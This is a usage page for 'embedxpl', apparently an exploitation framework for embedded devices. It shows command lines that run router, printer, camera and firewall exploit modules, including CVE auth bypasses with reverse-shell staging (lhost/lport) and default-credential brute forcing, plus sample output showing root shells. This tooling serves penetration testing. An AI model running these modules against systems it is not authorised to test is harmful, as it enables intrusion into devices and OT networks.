# Non-Interactive Mode

**Language:** English (en-US) | **pt-BR:** [../pt-BR/04-modo-nao-interativo.md](../pt-BR/04-modo-nao-interativo.md)

---

## Overview

Non-interactive mode executes a single module from the command line without opening the shell. It is suited for **automation**, CI pipelines, scripted assessments, and one-shot exploitation.

> **Note:** Non-interactive mode always calls `run()`. It does not call `check()` first. To run `check()`, use the interactive shell.

---

## Syntax

```bash
embedxpl -m <module_path> [-s "<option> <value>"] ...
```

All three entry points are equivalent:

```bash
embedxpl  -m <path> -s "<opt> <val>"   # pip entry point (recommended)
exf       -m <path> -s "<opt> <val>"   # alias
python -m embedxpl -m <path> -s "<opt> <val>"   # module invocation
python exf.py -m <path> -s "<opt> <val>"        # legacy bootstrap
```

---

## Flags

| Flag | Long form | Type | Required | Description |
|------|-----------|------|----------|-------------|
| `-h` | `--help` | — | No | Print help and exit |
| `-m` | `--module` | `str` (module path) | Yes* | Module path, e.g. `exploits/routers/dlink/dir_300_600_rce` |
| `-s` | `--set` | `str` (`"option value"`) | No | Set a module option; repeat for each option |
| `-T` | `--targets` | `str` (file path) | No | Multi-target file; each line `IP` or `IP:port` |
| — | `--infra` | `str` | No | Infrastructure type: `wizard`, `ot`, custom |
| — | `--context` | `str` | No | Context string for infra mode (e.g. `ics`) |
| — | `--target` | `str` | No | IP/CIDR for infra scan plan |

\* `-m` is required unless using `-T`, `--infra`, or `-h`.

---

## `-s` option format

Each `-s` takes a **single quoted string** containing `"option value"`:

```bash
# CORRECT — one option per -s flag:
embedxpl -m exploits/routers/dlink/dir_300_600_rce \
    -s "target 192.168.0.1" \
    -s "port 80"

# INCORRECT — do not put multiple options in one -s:
embedxpl -m ... -s "target 192.168.0.1 port 80"   # WRONG
```

For values containing spaces, quote the whole `-s` argument:

```bash
embedxpl -m exploits/printers/generic/pjl_info_disclosure \
    -s "target 10.0.0.50" \
    -s "cmd @PJL INFO ID"
```

---

## Examples

### Router credential test

```bash
embedxpl -m creds/routers/dlink/telnet_default_creds \
    -s "target 192.168.1.1"
```

Sample output:

```text
[*] Running module telnet_default_creds...
[*] Trying admin:admin on 192.168.1.1:23
[*] Trying admin:1234 on 192.168.1.1:23
[+] SUCCESS: admin:1234 — shell obtained
```

### Router exploit

```bash
embedxpl -m exploits/routers/dlink/dir_300_600_rce \
    -s "target 192.168.0.1" \
    -s "port 80"
```

Sample output:

```text
[*] Running module dir_300_600_rce...
[*] Sending exploit payload to 192.168.0.1:80
[+] Command executed: uid=0(root) gid=0(root)
```

### Printer exploit

```bash
embedxpl -m exploits/printers/hp/hp_printing_shellz_rce \
    -s "target 192.168.1.50" \
    -s "port 631" \
    -s "job_type pcl"
```

### Firewall — FortiOS auth bypass

```bash
embedxpl -m exploits/firewalls/fortinet/fortios_auth_bypass_cve_2022_40684 \
    -s "target 10.0.0.5"
```

### Firewall — PAN-OS GlobalProtect cookie bypass (CVE-2026-0257)

```bash
embedxpl -m exploits/firewalls/paloalto/globalprotect_auth_bypass_cve_2026_0257 \
    -s "target 203.0.113.10" \
    -s "forge_user admin" \
    -s "lhost 10.0.0.99" \
    -s "lport 4444" \
    -s "shell_type python"
```

### Camera CVE check

```bash
embedxpl -m exploits/cameras/hikvision/rtsp_rce_cve_2021_36260 \
    -s "target 192.168.1.100" \
    -s "port 80"
```

### FortiClientEMS bypass + shell staging

```bash
embedxpl \
    -m exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616 \
    -s "target 10.0.0.20" \
    -s "lhost 10.0.0.99" \
    -s "lport 9001" \
    -s "shell_type bash" \
    -s "force_exploit true"
```

---

## Multi-target mode (`-T`)

```bash
embedxpl -T /tmp/targets.txt
```

Each line in `targets.txt`:

```
192.168.1.1
192.168.1.2:8080
10.0.0.0/24
```

Sample output:

```text
[*] Multi-target scan: 3 entries
[*] [192.168.1.1] Scanning...
[+] [192.168.1.1] done — 2 modules matched
[*] [192.168.1.2:8080] Scanning...
[+] [192.168.1.2:8080] done — 1 module matched
[*] Summary: 2/3 hosts completed. Results in ~/.exf_sessions/
```

---

## Infrastructure wizard (`--infra`)

```bash
# Launch interactive infrastructure selection wizard
embedxpl --infra wizard

# Plan a scan for OT/ICS environment
embedxpl --infra ot --context ics --target 192.168.100.0/24
```

---

## Exit codes

| Code | Meaning |
|------|---------|
| `0` | Module ran to completion (does not imply target is vulnerable) |
| `1` | Error: missing module, import failure, or usage error |

---

## Automation tips

1. **Do not rely on exit code 0 for vulnerability confirmation** — it only means the module executed without fatal error. Parse stdout for `[+]` lines.
2. **Use `setg` in the shell** to set global options once, then run multiple modules without repeating options.
3. **Redirect output** for logging: `embedxpl -m ... 2>&1 | tee /tmp/scan.log`
4. **Parallel scans:** invoke multiple `embedxpl -m ... -T file.txt` processes with different target files.


[Wiki hub](../README.md)
